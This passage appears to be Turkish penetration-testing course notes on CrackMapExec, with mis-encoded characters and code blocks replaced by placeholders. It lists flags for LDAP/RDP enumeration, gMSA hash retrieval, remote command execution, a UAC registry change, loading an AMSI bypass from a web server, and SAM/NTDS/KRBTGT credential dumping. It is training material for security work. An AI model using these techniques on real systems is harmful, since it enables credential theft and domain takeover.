BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandÄ±rma

BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

{{CODE_BLOCK_153}}


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_155}}


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

{{CODE_BLOCK_156}}


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

{{CODE_BLOCK_157}}

* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

{{CODE_BLOCK_158}}


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

{{CODE_BLOCK_166}}

